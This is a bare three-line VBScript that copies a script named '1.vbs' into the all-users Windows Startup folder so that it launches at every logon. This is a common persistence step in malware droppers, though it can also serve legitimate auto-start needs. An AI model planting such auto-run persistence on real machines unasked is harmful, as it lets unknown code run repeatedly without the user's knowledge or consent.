dim FileSystemObject
set FileSystemObject=CreateObject("Scripting.FileSystemObject")
FileSystemObject.CopyFile ".\1.vbs", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\1.vbs"